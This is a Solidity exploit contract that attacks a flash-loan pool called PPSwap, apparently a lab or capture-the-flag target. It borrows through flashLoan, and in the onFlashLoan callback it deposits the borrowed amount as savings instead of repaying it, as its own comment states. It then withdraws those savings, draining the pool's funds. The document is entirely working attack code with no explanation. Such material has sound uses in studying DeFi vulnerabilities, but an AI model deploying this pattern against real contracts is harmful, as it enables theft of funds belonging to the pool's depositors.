
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.17;

import "./ppswap.sol";

contract Borrower {

    PPSwap private pool;
    address owner;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = PPSwap(payable(_pool));
        owner = msg.sender;
    }

    function onFlashLoan(
        address originator,
        uint256 amount
    ) external returns (bool result) {
        if(address(originator) != address(this))
             revert("I never loaned");

       // instead of returning I deposit     
        pool.approve(address(pool), amount);
        pool.depositSavings(amount); 

        return true;
    }

    function callFlashLoan(uint amount) public {
        pool.flashLoan(amount);
        pool.withdrawSavings(amount);
    }
}
